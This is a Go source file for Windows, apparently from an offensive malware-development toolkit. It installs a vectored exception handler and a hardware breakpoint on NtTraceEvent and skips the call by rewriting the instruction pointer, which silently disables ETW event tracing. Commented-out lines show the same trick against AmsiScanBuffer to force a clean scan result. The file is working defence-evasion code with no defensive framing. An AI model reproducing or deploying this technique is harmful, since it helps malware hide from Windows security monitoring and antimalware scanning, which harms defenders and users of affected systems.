//go:build windows
// +build windows

package main

import (
	"fmt"
	"unsafe"

	"github.com/redt1de/malice/pkg/callz/ntd"
	"github.com/redt1de/malice/pkg/dbg"
	"github.com/redt1de/malice/pkg/veh"
	"golang.org/x/sys/windows"
)

// GOOS=windows GOARCH=amd64 go build -o /work/maldev/testing/veh.exe cmd/veh/vehamsi.go

func main() {
	test := ntd.NewNtDll()
	NtTraceEvent := test.NewProc("NtTraceEvent")

	vh, _ := veh.New(windows.NewCallback(handler))
	fmt.Println("\nVEH hook in place!\n")

	// vh.SetBPLocal(pAmsiScanBuffer.Addr())
	vh.SetBPGlobal(NtTraceEvent.Addr())

	dbg.Debug = true
	dbg.Pause()
	// // test hooked call, with bad args
	// r1, _, _ = pAmsiScanBuffer.Call(0, 0, 0, 0)
	// fmt.Printf("hooked call, should return S_OK (0x0): 0x%x\n", r1)
}

/*
// struct main.EXCEPTION_RECORD (152 bytes)
//     ExceptionCode  offset: 0x0 (0)
//     ExceptionFlags  offset: 0x4 (4)
//     ExceptionRecord  offset: 0x8 (8)
//     ExceptionAddress  offset: 0x10 (16)
//     NumberParameters  offset: 0x18 (24)
//     ExceptionInformation  offset: 0x1c (28)

// struct main.CONTEXT
//     Rax  offset: 0x78 (120)
//     Rcx  offset: 0x80 (128)
//     Rdx  offset: 0x88 (136)
//     Rbx  offset: 0x90 (144)
//     Rsp  offset: 0x98 (152)
//     Rbp  offset: 0xa0 (160)
//     Rsi  offset: 0xa8 (168)
//     Rdi  offset: 0xb0 (176)
//     R8  offset: 0xb8 (184)
//     R9  offset: 0xc0 (192)
//     R10  offset: 0xc8 (200)
//     R11  offset: 0xd0 (208)
//     R12  offset: 0xd8 (216)
//     R13  offset: 0xe0 (224)
//     R14  offset: 0xe8 (232)
//     R15  offset: 0xf0 (240)
//     Rip  offset: 0xf8 (248)


MOVQ 0(AX), CX            // EXCEPTION_POINTERS->ExceptionRecord.ExceptionCode (first elem of each so offset is 0)
CMPL $-0x7ffffffc, 0(CX)  // ExceptionCode == EXCEPTION_SINGLE_STEP
JNE ????????????????      // if not jump to return CONTINUE_SEARCH

MOVQ 0x10(CX), CX         // ExceptionAddress -> CX
CMPQ CX, github.com/redt1de/malice/pkg/veh.TargetAddr(SB)
JNE ????????????????      // if not jump to return CONTINUE_SEARCH



*/

//go:nosplit
func handler(e *veh.EXCEPTION_POINTERS) uintptr {
	if e.ExceptionRecord.ExceptionCode == veh.EXCEPTION_SINGLE_STEP && e.ExceptionRecord.ExceptionAddress == veh.TargetAddr {
		// get the return address from the stack, and set the RIP to it
		println(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
		rsp2ptr := unsafe.Pointer(uintptr(e.ContextRecord.Rsp))
		addrFromRsp := unsafe.Slice((*byte)(unsafe.Pointer(uintptr(rsp2ptr))), 8) // readMemory(uintptr(rsp2ptr), 8)
		ReturnAddress := *(*uint64)(unsafe.Pointer(&addrFromRsp[0]))
		e.ContextRecord.Rip = ReturnAddress
		e.ContextRecord.Rsp += 8

		// change the return value
		//e.ContextRecord.Rax = 0 // S_OK
		// e.ContextRecord.Rax = 0x80070057 // E_INVALIDARG

		// Remove the breakpoint
		// e.ContextRecord.Dr0 = 0
		// e.ContextRecord.Dr7 = veh.SetBits(e.ContextRecord.Dr7, 0, 1, 0)
		// e.ContextRecord.Dr6 = 0
		// e.ContextRecord.EFlags |= 0x10000
		return uintptr(veh.UEXCEPTION_CONTINUE_EXECUTION)
	}

	return uintptr(veh.EXCEPTION_CONTINUE_SEARCH)
}
